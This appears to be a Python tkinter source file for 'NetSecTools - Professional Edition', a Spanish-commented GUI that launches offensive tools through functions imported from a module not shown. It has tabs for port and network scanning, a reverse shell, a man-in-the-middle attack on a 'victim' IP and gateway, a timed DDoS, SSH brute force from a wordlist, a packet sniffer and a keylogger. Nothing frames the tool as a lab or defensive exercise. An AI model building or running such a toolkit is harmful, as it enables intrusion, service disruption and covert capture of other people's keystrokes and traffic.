import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from functions import *
from utils import *
import threading
import queue
import time

# Variables globales de estado
sniffer_active = False
mitm_active = False
keylogger_active = False
stop_mitm = None
stop_keylogger = None
root = None
status_bar = None
sniffer_output = None
packets_queue = queue.Queue()

# Widgets globales
port_ip = port_start = port_end = net_range = None
mitm_target = mitm_gateway = mitm_btn = None
keylogger_file = keylogger_btn = keylogger_stop = None
shell_ip = shell_port = None
ddos_ip = ddos_port = ddos_duration = None
brute_ip = brute_user = brute_wordlist = None
sniffer_iface = sniffer_filter = sniffer_time = sniffer_btn = None

def update_status(message):
    """Actualiza la barra de estado"""
    status_bar.config(text=message)
    root.update_idletasks()

def start_port_scan():
    ip = port_ip.get().strip()
    start = int(port_start.get())
    end = int(port_end.get())
    
    def scan_thread():
        try:
            update_status("Escaneando...")
            ports = scan_ports(ip, start, end)
            result_text = "\n".join(f"• Puerto {p} abierto" for p in ports) if ports else "No se encontraron puertos abiertos"
            
            if 443 in ports:
                result_text += "\n\n✅ Puerto 443 (HTTPS) detectado correctamente"
            elif start <= 443 <= end:
                result_text += "\n\n⚠️ Puerto 443 no detectado (puede estar filtrado)"
            
            mostrar_resultado_con_descarga('resultado',result_text, 'portscan.txt')
        except Exception as e:
            messagebox.showerror("Error", f"Fallo: {str(e)}")
    
    threading.Thread(target=scan_thread, daemon=True).start()

def start_network_scan():
    ip_range = net_range.get() or None
    update_status("Escaneando red...")
    threading.Thread(
        target=lambda: mostrar_resultado_con_descarga(
            "Resultados Red",
            "Dispositivos:\n\n" + "\n\n".join(
                f"IP: {d['ip']}\nMAC: {d['mac']}\nHostname: {d['hostname']}"
                for d in scan_network(ip_range)
            ),
            "network_scan.txt"
        ),
        daemon=True
    ).start()

def start_reverse_shell():
    ip = shell_ip.get()
    port = shell_port.get()
    
    if not validar_ip(ip):
        messagebox.showerror("Error", "IP inválida")
        return
        
    if not validar_puerto(port):
        messagebox.showerror("Error", "Puerto inválido")
        return
        
    update_status(f"Conectando a {ip}:{port}...")
    threading.Thread(
        target=lambda: reverse_shell(ip, int(port)),
        daemon=True
    ).start()

def start_ddos():
    target = ddos_ip.get()
    port = ddos_port.get()
    duration = ddos_duration.get()
    
    if not target:
        messagebox.showerror("Error", "Ingrese un objetivo")
        return
        
    if not validar_puerto(port):
        messagebox.showerror("Error", "Puerto inválido")
        return
        
    try:
        duration = int(duration)
        if duration <= 0:
            raise ValueError
    except ValueError:
        messagebox.showerror("Error", "Duración debe ser un número positivo")
        return
        
    update_status(f"Iniciando DDoS contra {target}:{port}")
    threading.Thread(
        target=lambda: messagebox.showinfo(
            "DDoS",
            ddos_attack(target, int(port), duration)
        ),
        daemon=True
    ).start()

def start_brute_force():
    target = brute_ip.get()
    user = brute_user.get()
    wordlist = brute_wordlist.get()
    
    if not all([target, user, wordlist]):
        messagebox.showerror("Error", "Complete todos los campos")
        return
        
    if not os.path.isfile(wordlist):
        messagebox.showerror("Error", "Archivo de diccionario no encontrado")
        return
        
    update_status(f"Iniciando fuerza bruta contra {target}...")
    threading.Thread(
        target=lambda: mostrar_resultado_con_descarga(
            "Fuerza Bruta",
            f"Resultado para {user}@{target}:\n" + ssh_bruteforce(target, user, wordlist),
            f"bruteforce_{target}.txt"
        ),
        daemon=True
    ).start()

def toggle_mitm():
    global mitm_active, stop_mitm
    
    if not mitm_active:
        target = mitm_target.get()
        gateway = mitm_gateway.get()
        
        if not validar_ip(target) or not validar_ip(gateway):
            messagebox.showerror("Error", "IPs inválidas")
            return
            
        mitm_active = True
        mitm_btn.config(text="Detener MITM")
        update_status(f"Iniciando MITM entre {target} y {gateway}")
        
        stop_mitm = mitm_attack(target, gateway)
    else:
        mitm_active = False
        mitm_btn.config(text="Iniciar MITM")
        if stop_mitm:
            stop_mitm.set()
        update_status("MITM detenido")

def toggle_sniffer():
    global sniffer_active, sniffer_thread, sniffer_stop_event, packets_queue
    
    if not sniffer_active:
        iface = sniffer_iface.get().strip()
        if not iface:
            messagebox.showerror("Error", "Debe especificar una interfaz válida")
            return
            
        sniffer_active = True
        sniffer_stop_event = threading.Event()
        sniffer_btn.config(text="Detener Sniffer")
        sniffer_output.delete('1.0', tk.END)
        update_status(f"Sniffer iniciado en {iface}")
        
        # Limpiar la cola de paquetes
        with packets_queue.mutex:
            packets_queue.queue.clear()
        
        def capture_thread():
            try:
                packets = packet_sniffer(iface, sniffer_filter.get(), sniffer_stop_event)
                for pkt in packets:
                    packets_queue.put(pkt)
            finally:
                sniffer_stop_event.set()
                root.after(100, lambda: toggle_sniffer())
        
        def update_gui():
            if not sniffer_stop_event.is_set():
                try:
                    while not packets_queue.empty():
                        pkt = packets_queue.get_nowait()
                        sniffer_output.insert(tk.END, f"{pkt}\n")
                        sniffer_output.see(tk.END)
                except queue.Empty:
                    pass
                root.after(100, update_gui)
        
        sniffer_thread = threading.Thread(target=capture_thread, daemon=True)
        sniffer_thread.start()
        update_gui()
    else:
        sniffer_active = False
        if sniffer_stop_event:
            sniffer_stop_event.set()
        sniffer_btn.config(text="Iniciar Sniffer")
        update_status("Sniffer detenido")

def save_sniffer_results():
    content = sniffer_output.get('1.0', tk.END)
    if not content.strip():
        messagebox.showerror("Error", "No hay datos para guardar")
        return
        
    filename = filedialog.asksaveasfilename(
        defaultextension=".txt",
        filetypes=(("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")),
        title="Guardar captura"
    )
    
    if filename:
        try:
            with open(filename, 'w') as f:
                f.write(content)
            update_status(f"Captura guardada en {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo guardar: {str(e)}")

def toggle_keylogger():
    global keylogger_active, stop_keylogger
    
    if not keylogger_active:
        output_file = keylogger_file.get()
        stop_key = keylogger_stop.get().lower()
        
        if not output_file:
            messagebox.showerror("Error", "Especifique archivo de salida")
            return
            
        keylogger_active = True
        keylogger_btn.config(text=f"Presione {stop_key.upper()} para detener", state=tk.DISABLED)
        update_status(f"Keylogger iniciado. Presione {stop_key} para detener.")
        
        def keylogger_thread():
            result = keylogger(output_file, stop_key) or "No se capturaron datos"
            root.after(0, lambda: [
                mostrar_resultado_con_descarga("Keylogger", result, output_file),
                restore_keylogger_button()
            ])
        
        threading.Thread(target=keylogger_thread, daemon=True).start()
    else:
        if stop_keylogger:
            stop_keylogger.set()
        restore_keylogger_button()

def restore_keylogger_button():
    global keylogger_active
    keylogger_active = False
    keylogger_btn.config(text="Iniciar Keylogger", state=tk.NORMAL)
    update_status("Keylogger detenido")

def select_wordlist():
    filename = seleccionar_archivo("Seleccionar diccionario")
    if filename:
        brute_wordlist.delete(0, tk.END)
        brute_wordlist.insert(0, filename)

def setup_gui():
    global root, status_bar, sniffer_output
    global port_ip, port_start, port_end, net_range
    global mitm_target, mitm_gateway, mitm_btn
    global keylogger_file, keylogger_btn, keylogger_stop
    global shell_ip, shell_port
    global ddos_ip, ddos_port, ddos_duration
    global brute_ip, brute_user, brute_wordlist
    global sniffer_iface, sniffer_filter, sniffer_time, sniffer_btn

    root = tk.Tk()
    root.title("NetSecTools - Professional Edition")
    root.geometry("900x700")
    
    # Notebook (pestañas)
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)
    
    # Pestaña Escaneo
    scan_tab = ttk.Frame(notebook)
    notebook.add(scan_tab, text="Escaneo")
    
    # Frame Escaneo de Puertos
    port_frame = ttk.LabelFrame(scan_tab, text="Escaneo de Puertos")
    port_frame.pack(pady=5, padx=5, fill=tk.X)

    port_ip = crear_entrada_con_label(port_frame, "IP Objetivo:")
    port_start = crear_entrada_con_label(port_frame, "Puerto Inicial:", "1")
    port_end = crear_entrada_con_label(port_frame, "Puerto Final:", "1024")
    crear_boton(port_frame, "Iniciar Escaneo", start_port_scan)
    
    # Frame Escaneo de Red
    net_frame = ttk.LabelFrame(scan_tab, text="Escaneo de Red")
    net_frame.pack(pady=5, padx=5, fill=tk.X)
    
    net_range = crear_entrada_con_label(net_frame, "Rango de red (opcional):")
    crear_boton(net_frame, "Escanear Red", start_network_scan)
    
    # Pestaña Ataques
    attack_tab = ttk.Frame(notebook)
    notebook.add(attack_tab, text="Ataques")
    
    # Frame Reverse Shell
    shell_frame = ttk.LabelFrame(attack_tab, text="Reverse Shell")
    shell_frame.pack(pady=5, padx=5, fill=tk.X)
    
    shell_ip = crear_entrada_con_label(shell_frame, "IP Objetivo:")
    shell_port = crear_entrada_con_label(shell_frame, "Puerto:", "4444")
    crear_boton(shell_frame, "Conectar", start_reverse_shell)
    
    # Frame MITM
    mitm_frame = ttk.LabelFrame(attack_tab, text="Man in the Middle")
    mitm_frame.pack(pady=5, padx=5, fill=tk.X)
    
    mitm_target = crear_entrada_con_label(mitm_frame, "IP Víctima:")
    mitm_gateway = crear_entrada_con_label(mitm_frame, "IP Gateway:")
    mitm_btn = crear_boton(mitm_frame, "Iniciar MITM", toggle_mitm)
    
    # Frame DDoS
    ddos_frame = ttk.LabelFrame(attack_tab, text="Ataque DDoS")
    ddos_frame.pack(pady=5, padx=5, fill=tk.X)
    
    ddos_ip = crear_entrada_con_label(ddos_frame, "IP/Dominio Objetivo:")
    ddos_port = crear_entrada_con_label(ddos_frame, "Puerto:", "80")
    ddos_duration = crear_entrada_con_label(ddos_frame, "Duración (seg):", "30")
    crear_boton(ddos_frame, "Iniciar DDoS", start_ddos)
    
    # Frame Fuerza Bruta SSH
    brute_frame = ttk.LabelFrame(attack_tab, text="Fuerza Bruta SSH")
    brute_frame.pack(pady=5, padx=5, fill=tk.X)
    
    brute_ip = crear_entrada_con_label(brute_frame, "IP Objetivo:")
    brute_user = crear_entrada_con_label(brute_frame, "Usuario:")
    brute_wordlist = crear_entrada_con_label(brute_frame, "Diccionario:")
    crear_boton(brute_frame, "Seleccionar Archivo", select_wordlist, colspan=1, pady=2)
    crear_boton(brute_frame, "Iniciar Fuerza Bruta", start_brute_force, colspan=1, pady=2)
    
    # Pestaña Monitorización
    monitor_tab = ttk.Frame(notebook)
    notebook.add(monitor_tab, text="Monitorización")
    
    # Frame Sniffer
    sniffer_frame = ttk.LabelFrame(monitor_tab, text="Sniffer de Paquetes")
    sniffer_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
    
    sniffer_iface = crear_entrada_con_label(sniffer_frame, "Interfaz:", "enp4s0")
    sniffer_filter = crear_entrada_con_label(sniffer_frame, "Filtro:", "tcp")
    sniffer_btn = crear_boton(sniffer_frame, "Iniciar Sniffer", toggle_sniffer, colspan=1, pady=2)
    crear_boton(sniffer_frame, "Guardar Captura", save_sniffer_results, colspan=1, pady=2)
    sniffer_output = crear_area_texto(sniffer_frame)
    
    # Frame Keylogger
    keylogger_frame = ttk.LabelFrame(monitor_tab, text="Keylogger")
    keylogger_frame.pack(pady=5, padx=5, fill=tk.X)
    
    keylogger_file = crear_entrada_con_label(keylogger_frame, "Archivo de salida:", "keylog.txt")
    keylogger_stop = crear_entrada_con_label(keylogger_frame, "Tecla de parada:", "f12")
    keylogger_btn = crear_boton(keylogger_frame, "Iniciar Keylogger", toggle_keylogger)
    
    # Barra de estado
    status_bar = tk.Label(root, text="Listo", bd=1, relief=tk.SUNKEN, anchor=tk.W)
    status_bar.pack(fill=tk.X, pady=(10, 0))
    
    root.mainloop()

if __name__ == "__main__":
    setup_gui()